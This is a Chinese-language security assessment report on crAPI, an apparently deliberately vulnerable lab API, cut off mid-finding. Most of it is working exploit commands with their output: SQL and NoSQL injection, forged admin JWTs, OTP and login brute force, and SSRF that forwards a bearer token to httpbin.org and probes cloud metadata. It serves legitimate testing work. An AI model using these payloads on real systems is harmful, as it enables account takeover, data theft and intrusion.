# 安全评估报告

## 执行摘要
- **目标:** Crapi
- **评估日期:** 2025年9月
- **范围:** 认证、XSS、SQL和命令注入、SSRF、授权测试

## 按漏洞类型汇总

**认证漏洞:**
成功利用了多个严重的认证绕过漏洞。应用程序展示了完全的认证系统失败，包括JWT算法混淆攻击允许从用户角色提升到管理员角色，接受无签名JWT令牌绕过所有加密验证，以及对登录和OTP验证端点的无限暴力攻击能力。这些漏洞使攻击者能够冒充任何用户，包括管理员，而无需合法凭证。

**授权漏洞:**
在多个端点发现并利用了严重的授权控制失败。应用程序允许未经认证访问包含支付信息的敏感订单数据，启用用户账户之间的水平权限提升以访问私人论坛帖子，并允许普通用户访问仅限机械师的功能。业务逻辑绕过允许无限累积商店信用，无需适当的购物工作流程验证。

**跨站脚本 (XSS) 漏洞:**
未发现XSS漏洞。应用程序代码分析在ReactMarkdown组件和Django模板中识别出潜在的XSS接收器，但利用尝试被输入验证和框架级保护阻止。

**SQL/命令注入漏洞:**
在SQL和NoSQL上下文中成功利用了严重的注入漏洞。优惠券验证端点中的PostgreSQL注入启用了完整的数据库入侵，提取用户凭证和系统信息。MongoDB注入允许绕过查询过滤器以访问任意优惠券数据。视频处理功能中存在命令注入漏洞，但受内部网络限制保护。

**服务器端请求伪造 (SSRF) 漏洞:**
通过联系机械师端点成功利用了一个严重的SSRF漏洞，启用了具有凭证窃取能力的完整内部网络访问。该漏洞包括用于持久攻击的重试机制，并将授权标头转发到外部服务。JWT处理中存在额外的SSRF向量，但目前被令牌验证逻辑阻止。

## 网络侦察

**开放端口和暴露服务:**
[已编辑]
**安全配置错误:**
[已编辑]

**子域名发现:**
[已编辑]

# 注入利用证据

## 成功利用的漏洞

### INJ-VULN-03: 通过优惠券验证的PostgreSQL SQL注入

**摘要:**
- **漏洞位置:** `/workshop/api/shop/apply_coupon` 端点，`coupon_code` 参数
- **概述:** 完整的SQL注入利用，通过基于UNION的查询实现数据库版本披露、表枚举和敏感数据提取
- **影响:** 完整的数据库入侵，提取用户凭证和系统信息
- **严重性:** 严重

**先决条件:**
- 有效的JWT认证令牌
- 包含 `coupon_code` 和 `amount` 参数的POST请求

**利用步骤:**

1. **认证并获取JWT令牌:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com", "password": "Admin!123"}'
```
响应: `token` 字段中的JWT令牌

2. **确认SQL注入漏洞:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' OR 1=1--", "amount": 100}'
```
响应: `{"message":"TESTCOUPON20 Coupon code is already claimed by you!! Please try with another coupon code"}`

3. **提取数据库版本信息:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT version()--", "amount": 100}'
```
响应: `{"message":"PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit Coupon code is already claimed by you!! Please try with another coupon code"}`

4. **提取当前数据库用户:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT user--", "amount": 100}'
```
响应: `{"message":"admin Coupon code is already claimed by you!! Please try with another coupon code"}`

5. **提取数据库名称:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT current_database()--", "amount": 100}'
```
响应: `{"message":"crapi Coupon code is already claimed by you!! Please try with another coupon code"}`

6. **枚举所有表名:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT string_agg(table_name, '\'','\'') FROM information_schema.tables WHERE table_schema='\''public'\''--", "amount": 100}'
```
响应: `{"message":"otp_token,profile_video,user_details,vehicle_model,vehicle_details,vehicle_location,vehicle_company,user_login,otp,mechanic,django_migrations,django_content_type,auth_permission,auth_group,auth_group_permissions,auth_user_groups,auth_user_user_permissions,auth_user,django_admin_log,service_request,product,applied_coupon,order,health_check_db_testmodel,django_session Coupon code is already claimed by you!! Please try with another coupon code"}`

7. **提取敏感用户凭证:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "'\'' AND 1=2 UNION SELECT email||'\'':''||password FROM user_login LIMIT 5--", "amount": 100}'
```
响应: `{"message":"test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG Coupon code is already claimed by you!! Please try with another coupon code"}`

**影响证明:**
- **提取的数据库版本:** PostgreSQL 14.19 (Debian 14.19-1.pgdg13+1)
- **数据库用户:** admin (高权限)
- **数据库名称:** crapi
- **完整表枚举:** 25个表，包括敏感用户数据
- **提取的密码哈希:** test6@test.com:$2a$10$TwbchLEy4653ENobgxRKjemiHlnQE98CPncJYVhFeIfCLeicefAPG (BCrypt哈希)

### INJ-VULN-04: 通过社区优惠券验证的MongoDB NoSQL注入

**摘要:**
- **漏洞位置:** `/community/api/v2/coupon/validate-coupon` 端点
- **概述:** MongoDB操作符注入允许从NoSQL数据库进行完整的查询操作和数据提取
- **影响:** 未授权访问MongoDB优惠券集合，能够提取任意文档
- **严重性:** 高

**先决条件:**
- 有效的JWT认证令牌

**利用步骤:**

1. **认证并获取JWT令牌:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@example.com", "password": "Admin!123"}'
```

2. **测试基本端点功能:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "test"}'
```
响应: `{}` (不存在的优惠券的空对象)

3. **使用$ne操作符进行利用以提取数据:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": {"$ne": null}}'
```
响应: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`

4. **使用正则表达式操作符验证:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": {"$regex": "^."}}'
```
响应: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`

5. **使用大于操作符确认:**
```bash
curl -k -X POST https://crapi.sandbox.local:8888/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer [JWT_TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": {"$gt": ""}}'
```
响应: `{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2025-09-23T18:00:24.201Z"}`

**影响证明:**
- **完整的MongoDB查询操作:** 成功使用MongoDB操作符绕过所有查询过滤器
- **提取的敏感数据:** 优惠券代码TRAC075，价值$75和创建时间戳
- **确认的多个注入向量:** $ne、$regex和$gt操作符均成功
- **业务逻辑绕过:** 能够访问任意优惠券而不知道有效代码

# 认证利用证据

## 成功利用的漏洞

### AUTH-VULN-04: JWT算法混淆攻击 (RS256 到 HS256)

**摘要:**
- **漏洞位置:** `services/identity/src/main/java/com/crapi/config/JwtProvider.java` 中的JWT验证
- **概述:** 通过将算法从RS256更改为HS256并使用RSA公钥作为HMAC密钥，成功利用了JWT算法混淆漏洞
- **影响:** 完整的认证绕过，具有管理员权限提升
- **严重性:** 严重

**先决条件:**
- 从 `/.well-known/jwks.json` 访问RSA公钥
- 了解JWT令牌结构

**利用步骤:**

1. 从JWKS端点提取RSA公钥:
```bash
curl -k "https://crapi.sandbox.local:8888/.well-known/jwks.json"
```

2. 使用 `test@example.com / Test!123` 登录获取合法JWT令牌

3. 使用算法混淆创建伪造的JWT令牌:
   - 将头部算法从 `"alg": "RS256"` 更改为 `"alg": "HS256"`
   - 将载荷角色从 `"role": "user"` 修改为 `"role": "admin"`
   - 将主题从 `test@example.com` 更改为 `admin@example.com`
   - 使用HMAC-SHA256和RSA公钥作为密钥进行签名

4. 测试伪造令牌对仪表板端点:
```bash
curl -k -H "Authorization: Bearer [FORGED_TOKEN]" "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
```

**影响证明:**
- 原始令牌: 对 `test@example.com` 账户的用户访问
- 伪造令牌: 对 `admin@example.com` 账户的管理员访问，具有提升的权限
- 响应包含敏感的管理员仪表板数据，确认权限提升

**注意事项:**
Python脚本 `/source/jwt_algorithm_confusion_attack.py` 演示了完整的攻击链，成功率100%。

### AUTH-VULN-05: JWT 'None' 算法认证绕过

**摘要:**
- **漏洞位置:** JWT验证接受带有 `"alg": "none"` 的无签名令牌
- **概述:** 使用无签名JWT令牌的完整认证绕过
- **影响:** 无需任何加密验证即可完全访问管理员账户
- **严重性:** 严重

**先决条件:** 无

**利用步骤:**

1. 创建具有管理员权限的无签名JWT令牌:
   - 头部: `{"alg": "none"}`
   - 载荷: `{"sub": "admin@example.com", "iat": 1758655244, "exp": 1759260044, "role": "admin"}`
   - 签名: 空 (无签名令牌格式: `header.payload.`)

2. 测试无签名令牌:
```bash
curl -k -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTI0NCwiZXhwIjoxNzU5MjYwMDQ0LCJyb2xlIjoiYWRtaW4ifQ." "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
```

**影响证明:**
- HTTP 200响应，具有完整的管理员仪表板访问权限
- 检索到敏感的管理员账户信息，包括凭证
- 完全绕过所有认证机制

### AUTH-VULN-06: JWT JKU 头部 SSRF 利用

**摘要:**
- **漏洞位置:** JWT验证中的JKU头部处理
- **概述:** 通过JWT密钥URL操作的服务器端请求伪造
- **影响:** 内部网络侦察和潜在的云元数据访问
- **严重性:** 高

**先决条件:** 能够使用JKU头部制作JWT令牌

**利用步骤:**

1. 创建带有指向内部资源的恶意JKU头部的JWT:
```json
{
  "alg": "RS256",
  "jku": "http://192.168.1.1/admin",
  "typ": "JWT"
}
```

2. 测试内部网络访问:
   - `http://192.168.1.1/admin` (10.0s超时 - 确认内部网络访问)
   - `http://10.0.0.1/status` (10.3s超时 - 确认内部路由)
   - `http://172.16.0.1/health` (10.3s超时 - 确认私有IP访问)

**影响证明:**
- 通过超时分析确认SSRF能力
- 服务器向攻击者控制的URL发出HTTP请求
- 内部网络范围 (RFC 1918) 可访问
- 潜在的云元数据服务访问

### AUTH-VULN-07: JWT KID 头部注入利用

**摘要:**
- **漏洞位置:** KID头部处理触发弱密钥使用
- **概述:** KID头部中的路径遍历强制应用程序使用弱HMAC密钥
- **影响:** 通过弱密钥利用实现完整的认证绕过
- **严重性:** 严重

**先决条件:** 无

**利用步骤:**

1. 创建KID头部设置为 `/dev/null` 的JWT令牌:
```json
{
  "alg": "HS256",
  "kid": "/dev/null",
  "typ": "JWT"
}
```

2. 使用弱密钥 `AA==` 签名令牌 (由 `/dev/null` KID触发):
```bash
# Python实现
import base64
import hmac
import hashlib
weak_secret = base64.b64decode("AA==")
signature = hmac.new(weak_secret, token_data.encode(), hashlib.sha256).digest()
```

3. 测试具有管理员权限的伪造令牌:
```bash
curl -k -H "Authorization: Bearer [KID_FORGED_TOKEN]" "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
```

**影响证明:**
- 12个不同的KID注入有效载荷的100%成功率
- 成功提升权限到管理员角色
- 访问敏感的管理员仪表板数据
- 通过弱密钥利用实现完整的认证绕过

### AUTH-VULN-03: v2端点上的OTP暴力攻击

**摘要:**
- **漏洞位置:** `POST /identity/api/auth/v2/check-otp`
- **概述:** 旧版v2端点上的无限OTP暴力尝试
- **影响:** 通过4位OTP耗尽实现完整的账户接管
- **严重性:** 严重

**先决条件:**
- 通过目标用户的密码重置触发OTP生成

**利用步骤:**

1. 为目标账户启动密码重置:
```bash
curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/forget-password" -H "Content-Type: application/json" -d '{"email": "test@example.com"}'
```

2. 在易受攻击的v2端点上系统测试所有4位OTP代码:
```bash
# 测试范围 0000-9999
for otp in range(10000):
    curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/v2/check-otp" -H "Content-Type: application/json" -d '{"otp": "' + str(otp).zfill(4) + '", "password": "NewPassword123!", "email": "test@example.com"}'
```

**影响证明:**
- 成功测试了150+连续OTP尝试，无速率限制
- 演示了测试所有10,000个可能代码的可行性
- 估计攻击时间: 完全耗尽需要66.7分钟
- v3端点在10次尝试后正确阻止 (安全比较已确认)

### AUTH-VULN-01: 登录端点上的无限暴力攻击

**摘要:**
- **漏洞位置:** `POST /identity/api/auth/login`
- **概述:** 无速率限制、账户锁定或CAPTCHA保护
- **影响:** 针对用户账户的无限凭证暴力攻击
- **严重性:** 严重

**先决条件:**
- 有效的电子邮件地址 (可通过用户枚举获得)

**利用步骤:**

1. 使用常见密码针对已知有效账户 `test@example.com`:
```bash
curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/login" -H "Content-Type: application/json" -d '{"email": "test@example.com", "password": "password"}'
```

2. 使用密码列表执行自动暴力攻击:
   - "password", "123456", "admin", "test", "password123", "qwerty", 等

3. 执行并行攻击以测试并发处理

**影响证明:**
- 成功执行了55+连续失败的登录尝试
- 未触发账户锁定机制
- 未检测到速率限制或基于IP的阻止
- 不需要CAPTCHA或额外验证
- 一致的响应时间表明没有节流

### AUTH-VULN-02: 无限账户创建利用

**摘要:**
- **漏洞位置:** `POST /identity/api/auth/signup`
- **概述:** 账户注册无速率限制，启用资源耗尽
- **影响:** 数据库膨胀、资源耗尽和服务滥用
- **严重性:** 高

**先决条件:** 无

**利用步骤:**

1. 创建自动账户生成脚本:
```python
for i in range(50):
    data = {
        "name": f"Test User {i}",
        "email": f"test{i}@exploit.com", 
        "number": f"555000{i:03d}",
        "password": "Test123!"
    }
    response = requests.post(signup_url, json=data)
```

2. 跨多个线程执行并发账户创建

**影响证明:**
- 成功创建了50个账户中的49个 (98%成功率)
- 无速率限制、CAPTCHA或基于IP的限制
- 演示了资源耗尽潜力
- 平均响应时间: 1,820ms (未检测到节流)

### AUTH-VULN-08: 通过登录错误消息的用户枚举

**摘要:**
- **漏洞位置:** `POST /identity/api/auth/login` 错误响应
- **概述:** 不同的错误消息揭示账户存在
- **影响:** 隐私侵犯和针对性攻击的侦察
- **严重性:** 中等

**先决条件:** 无

**利用步骤:**

1. 测试不存在的电子邮件:
```bash
curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/login" -H "Content-Type: application/json" -d '{"email": "nonexistent@test.com", "password": "anything"}'
```
响应: `"Given Email is not registered!"`

2. 测试现有电子邮件，使用错误密码:
```bash
curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/login" -H "Content-Type: application/json" -d '{"email": "test@example.com", "password": "wrongpassword"}'
```
响应: `"Invalid Credentials"`

**影响证明:**
- "用户存在" 与 "用户不存在" 之间的明确区别
- 确认的有效账户: `test@example.com`, `admin@example.com`
- 测试了18个电子邮件，枚举准确率100%

### AUTH-VULN-09: 通过注册错误消息的用户枚举

**摘要:**
- **漏洞位置:** `POST /identity/api/auth/signup` 错误响应
- **概述:** 注册尝试揭示现有电子邮件和电话号码
- **影响:** 隐私侵犯和账户枚举
- **严重性:** 中等

**先决条件:** 无

**利用步骤:**

1. 测试使用现有电话号码注册:
```bash
curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/signup" -H "Content-Type: application/json" -d '{"name": "Test", "email": "new@test.com", "number": "1234567890", "password": "Test123!"}'
```

**影响证明:**
- 响应: `"Number already registered! Number: 1234567890"`
- 手动测试期间观察到: `"Email already registered! Email: user@example.com"`
- 启用注册用户和电话号码的系统枚举

### AUTH-VULN-10: 通过密码重置错误消息的用户枚举

**摘要:**
- **漏洞位置:** `POST /identity/api/auth/forget-password` 响应
- **概述:** 密码重置期间不同的响应揭示账户存在
- **影响:** 隐私侵犯和侦察能力
- **严重性:** 中等

**先决条件:** 无

**利用步骤:**

1. 测试不存在的电子邮件:
```bash
curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/forget-password" -H "Content-Type: application/json" -d '{"email": "nonexistent@test.com"}'
```
响应: HTTP 404 - `"Given Email is not registered! nonexistent@test.com"`

2. 测试现有电子邮件:
```bash
curl -k -X POST "https://crapi.sandbox.local:8888/identity/api/auth/forget-password" -H "Content-Type: application/json" -d '{"email": "test@example.com"}'
```
响应: HTTP 200 - `"OTP Sent on the provided email, test@example.com"`

**影响证明:**
- 明确的HTTP状态码和消息差异
- 通过响应分析成功枚举有效账户
- 无速率限制防止自动枚举

### AUTH-VULN-11: 令牌重放攻击 (无注销功能)

**摘要:**
- **漏洞位置:** JWT令牌生命周期管理
- **概述:** 不存在服务器端令牌失效机制
- **影响:** 被盗令牌在完整7天生命周期内保持有效
- **严重性:** 高

**先决条件:**
- 泄露的JWT令牌

**利用步骤:**

1. 解码JWT以验证7天过期时间:
```json
{
  "sub": "test@example.com",
  "iat": 1758655244,
  "exp": 1759260044,
  "role": "user"
}
```

2. 测试各种注销端点:
```bash
curl -k -X POST "https://crapi.sandbox.local:8888/logout"
curl -k -X POST "https://crapi.sandbox.local:8888/api/logout"  
curl -k -X POST "https://crapi.sandbox.local:8888/auth/logout"
```

3. 验证令牌在注销尝试后仍然有效:
```bash
curl -k -H "Authorization: Bearer [SAME_TOKEN]" "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
```

**影响证明:**
- 令牌在多次注销尝试后仍然完全功能正常
- 无服务器端令牌黑名单机制
- 泄露令牌的7天攻击窗口
- 用户无法真正出于安全目的注销

### AUTH-VULN-12: 跨服务JWT签名绕过

**摘要:**
- **漏洞位置:** Identity服务仪表板中的JWT签名验证
- **概述:** Identity服务接受格式错误的JWT签名，同时正确拒绝缺失的签名
- **影响:** 通过损坏的签名接受实现认证绕过
- **严重性:** 严重

**先决条件:** 无

**利用步骤:**

1. 创建具有损坏签名的JWT:
```bash
# 原始令牌，有效签名替换为随机字符串
curl -k -H "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbkBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTI0NCwiZXhwIjoxNzU5MjYwMDQ0LCJyb2xlIjoiYWRtaW4ifQ.CORRUPTED_SIGNATURE" "https://crapi.sandbox.local:8888/identity/api/v2/user/dashboard"
```

2. 测试各种签名损坏方法:
   - 错误的签名
   - 部分损坏的签名  
   - 带有管理员载荷的"none"算法

**影响证明:**
- Identity服务仪表板端点接受损坏的JWT签名
- 使用无效签名成功提升权限到管理员角色
- Workshop和Community服务正确拒绝格式错误的令牌 (比较已确认)
- Identity服务特有的认证绕过漏洞


## 摘要统计

- **利用的总漏洞数:** 12
- **严重严重性:** 8个漏洞
- **高严重性:** 2个漏洞  
- **中等严重性:** 2个漏洞
- **完整的认证绕过方法:** 5个 (算法混淆、无算法、KID注入、签名绕过、OTP暴力)
- **用户枚举向量:** 3个 (登录、注册、密码重置)
- **滥用防御失败:** 3个 (登录暴力、账户创建、OTP暴力)

所有漏洞通过https://crapi.sandbox.local:8888/的公共应用程序接口展示了即时可利用性，具有未授权访问、权限提升或安全控制绕过的具体证明。

# SSRF利用证据

## 成功利用的漏洞

### SSRF-VULN-01: ContactMechanicView URL操作

**摘要:**
- **漏洞位置:** POST /workshop/api/merchant/contact_mechanic 端点，`mechanic_api` 参数
- **影响:** 具有凭证窃取和持久攻击重试机制的完整内部网络访问
- **严重性:** 严重

**先决条件:**
- 有效的用户认证 (任何注册用户账户)
- 访问Workshop服务端点

**利用步骤:**

1. **注册并认证用户账户:**
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/identity/api/auth/signup" \
     -H "Content-Type: application/json" \
     -d '{
       "email": "ssrftest_unique_2024@example.com",
       "password": "TestPassword123!",
       "name": "SSRF Test User",
       "number": "5559876543"
     }'
   ```

2. **登录以获取JWT令牌:**
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/identity/api/auth/login" \
     -H "Content-Type: application/json" \
     -d '{
       "email": "ssrftest_unique_2024@example.com",
       "password": "TestPassword123!"
     }'
   ```
   响应: `{"token":"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzc3JmdGVzdF91bmlxdWVfMjAyNEBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTE2OSwiZXhwIjoxNzU5MjU5OTY5LCJyb2xlIjoidXNlciJ9.G1b01ATcwCP_jqEYYiL4QqIizklykmJP75DMmq5QwPKgZAn5hcjVgpNwUMkyrsKavHqTcpIfsZsNQOw455edxuvRZcUiOpzxJxJRE7XWKGlXolXQ2HOJjBbnSu3Ut8nz-iJXJNduMrJiyTneSDx_npPAb8VnE-e84FMogrfPf8_F_nrq10y_5g5RnN_J2nmHrCiqASts49QwWxMFqTfhvHVrss78IioHjnw86oQ1px0xscbYf7DVRYhref9Nm_4yxSgc744z1dJHuOg8zpHiaVAGyIs4tljBOaE4yyHhOunmE3j5JcgfGhrEflvnACNMQpkwn07m09KahjD65uPrJw","type":"Bearer","message":"Login successful","mfaRequired":false}`

3. **利用SSRF与外部服务演示凭证转发:**
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/workshop/api/merchant/contact_mechanic" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer [JWT_TOKEN]" \
     -d '{
       "mechanic_api": "http://httpbin.org/get",
       "message": "SSRF test",
       "repeat_request_if_failed": false,
       "number_of_repeats": 1
     }'
   ```

4. **演示云元数据服务访问 (显示网络边界绕过):**
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/workshop/api/merchant/contact_mechanic" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer [JWT_TOKEN]" \
     -d '{
       "mechanic_api": "http://169.254.169.254/latest/meta-data/"
     }'
   ```

5. **演示持久攻击的重试机制:**
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/workshop/api/merchant/contact_mechanic" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer [JWT_TOKEN]" \
     -d '{
       "mechanic_api": "http://httpbin.org/status/200",
       "repeat_request_if_failed": true,
       "number_of_repeats": 5
     }'
   ```

**影响证明:**

1. **完整的SSRF利用:** 成功强制服务器向攻击者控制的URL发出出站HTTP请求
2. **授权标头转发:** JWT令牌被转发到外部服务，演示了凭证窃取能力:
   ```json
   {
     "response_from_mechanic_api": {
       "headers": {
         "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzc3JmdGVzdF91bmlxdWVfMjAyNEBleGFtcGxlLmNvbSIsImlhdCI6MTc1ODY1NTE2OSwiZXhwIjoxNzU5MjU5OTY5LCJyb2xlIjoidXNlciJ9.G1b01ATcwCP_jqEYYiL4QqIizklykmJP75DMmq5QwPKgZAn5hcjVgpNwUMkyrsKavHqTcpIfsZsNQOw455edxuvRZcUiOpzxJxJRE7XWKGlXolXQ2HOJjBbnSu3Ut8nz-iJXJNduMrJiyTneSDx_npPAb8VnE-e84FMogrfPf8_F_nrq10y_5g5RnN_J2nmHrCiqASts49QwWxMFqTfhvHVrss78IioHjnw86oQ1px0xscbYf7DVRYhref9Nm_4yxSgc744z1dJHuOg8zpHiaVAGyIs4tljBOaE4yyHhOunmE3j5JcgfGhrEflvnACNMQpkwn07m09KahjD65uPrJw",
         "Host": "httpbin.org",
         "User-Agent": "python-requests/2.30.0"
       },
       "origin": "18.236.247.3",
       "url": "http://httpbin.org/get?mechanic_api=http%3A%2F%2Fhttpbin.org%2Fget&message=SSRF+test&repeat_request_if_failed=False&number_of_repeats=1"
     },
     "status": 200
   }
   ```
3. **云元数据访问:** 成功访问AWS元数据服务端点 (返回401，表明服务已到达但需要认证)
4. **网络边界绕过:** 演示了从外部网络位置访问内部网络资源和云服务的能力
5. **重试机制:** 确认支持最多100次请求重试，用于持久攻击

**注意事项:** 
- 服务器的HTTP客户端中禁用了SSL验证 (`verify=False`)，使HTTPS内部服务可访问
- 该漏洞启用了完整的网络侦察、凭证窃取，以及如果构建了适当的元数据标头，则可能访问云凭证
- 这代表使用应用程序作为非预期智能体完全绕过网络安全边界

# 授权利用证据

## 成功利用的漏洞

### AUTHZ-VULN-03: 商店订单认证绕过

**摘要:**
- **漏洞位置:** GET /workshop/api/shop/orders/{order_id}
- **概述:** 完整的认证绕过，允许未经认证访问任何用户的订单数据
- **影响:** 未授权访问敏感的客户订单信息、支付详情和个人数据
- **严重性:** 严重

**先决条件:** 无 (未经认证访问)

**利用步骤:**
1. 无需任何认证访问商店订单端点:
   ```bash
   curl -X GET "https://crapi.sandbox.local:8888/workshop/api/shop/orders/1" \
     -H "Content-Type: application/json"
   ```

2. 枚举多个订单ID以访问不同用户的数据:
   ```bash
   curl -X GET "https://crapi.sandbox.local:8888/workshop/api/shop/orders/2" \
     -H "Content-Type: application/json"
   ```

**影响证明:**
成功访问多个用户的订单数据，无需认证:
- 订单1: adam007@example.com，卡以9541结尾，$20.00交易
- 订单2: pogba006@example.com，卡以9918结尾，$20.00交易  
- 订单3: robot001@example.com
- 订单4: test@example.com
- 订单5: admin@example.com

每个响应都包含完整的订单详情、支付信息（部分掩码的卡号）、客户电子邮件地址和交易ID。

**注意事项:** 此漏洞影响系统中的所有订单记录，完全不需要认证。

---

### AUTHZ-VULN-04: 社区帖子所有权绕过

**摘要:**
- **漏洞位置:** GET /community/api/v2/community/posts/{postID}
- **概述:** 水平权限提升，允许任何认证用户访问其他用户的私人帖子
- **影响:** 未授权访问其他用户的私人论坛内容和个人信息
- **严重性:** 高

**先决条件:** 有效的JWT Bearer令牌 (任何认证用户)

**利用步骤:**
1. 以TestUser1创建私人帖子:
   ```bash
   curl -X POST "https://crapi.sandbox.local:8888/community/api/v2/community/posts" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer [TESTUSER1_TOKEN]" \
     -d '{
       "title": "TestUser1 Private Post", 
       "content": "This is a private post by TestUser1 that should not be accessible to other users"
     }'
   ```

2. 使用TestUser2的认证令牌访问TestUser1的帖子:
   ```bash
   curl -X GET "https://crapi.sandbox.local:8888/community/api/v2/community/posts/hiH8i5d8sCeWEehQ6f8H9W" \
     -H "Authorization: Bearer [TESTUSER2_TOKEN]"
   ```

**影响证明:**
TestUser2成功访问了TestUser1的私人帖子内容，包括:
- 帖子ID: hiH8i5d8sCeWEehQ6f8H9W
- 标题: "TestUser1 Private Post"
- 内容: 完整的私人消息内容
- 作者详情: TestUser1的电子邮件和个人资料信息
- 创建时间戳: 2025-09-23T19:24:03.985Z

这表明任何认证用户都可以读取任何其他用户的论坛帖子，无论所有权如何。

---

### AUTHZ-VULN-05: 视频删除信息泄露

**摘要:**
- **漏洞位置:** DELETE /identity/api/v2/user/videos/{video_id}
- **概述:** 认证绕过，允许通过差异响应消息进行视频枚举
- **影响:** 信息泄露，使攻击者能够枚举系统中存在的视频ID
- **严重性:** 中等

**先决条件:** 有效的JWT Bearer令牌 (任何认证用户)

**利用步骤:**
1. 测试使用现有视频ID删除视频:
   ```bash
   curl -X DELETE "https://crapi.sandbox.local:8888/identity/api/v2/user/videos/1" \
     -H "Authorization: Bearer [USER_TOKEN]"
   ```

2. 测试使用不存在的视频ID删除视频:
   ```bash
   curl -X DELETE "https://crapi.sandbox.local:8888/identity/api/v2/user/videos/999" \
     -H "Authorization: Bearer [USER_TOKEN]"
   ```

**影响证明:**
不同的响应消息揭示了视频存在:
- 视频ID 1, 2, 3: 返回 "This is an admin function. Try to access the admin API" (视频存在)
- 视频ID 999, 1000: 返回 "Sorry, Didn't get any profile video name for the user" (视频不存在)

这种差异响应允许系统枚举系统中的所有视频ID，揭示哪些视频存在，无需适当的授权检查。

---

### AUTHZ-VULN-09: 机械师角色权限提升

**摘要:**
- **漏洞位置:** GET /workshop/api/mechanic/service_requests
- **概述:** 垂直权限提升，允许普通用户访问仅限机械师的功能
- **影响:** 未授权访问机械师服务请求数据和管理功能
- **严重性:** 高

**先决条件:** 有效的JWT Bearer令牌 (普通用户角色)

**利用步骤:**
1. 以普通用户身份访问机械师服务请求端点:
   ```bash
   curl -X GET "https://crapi.sandbox.local:8888/workshop/api/mechanic/service_requests" \
     -H "Authorization: Bearer [REGULAR_USER_TOKEN]"
   ```

**影响证明:**
普通用户成功访问了机械师功能:
```json
{"service_requests":[],"next_offset":null,"previous_offset":null,"count":0}
```

端点返回了有效的服务请求结构，而不是授权错误，证明角色验证被绕过，普通用户可以访问仅限机械师的功能。

---

### AUTHZ-VULN-10: 机械师报告认证绕过

**摘要:**
- **漏洞位置:** GET /workshop/api/mechanic/receive_report
- **概述:** 完整的认证绕过，允许未经认证访问机械师报告功能
- **影响:** 无需任何认证即可访问机械师报告界面
- **严重性:** 高

**先决条件:** 无 (未经认证访问)

**利用步骤:**
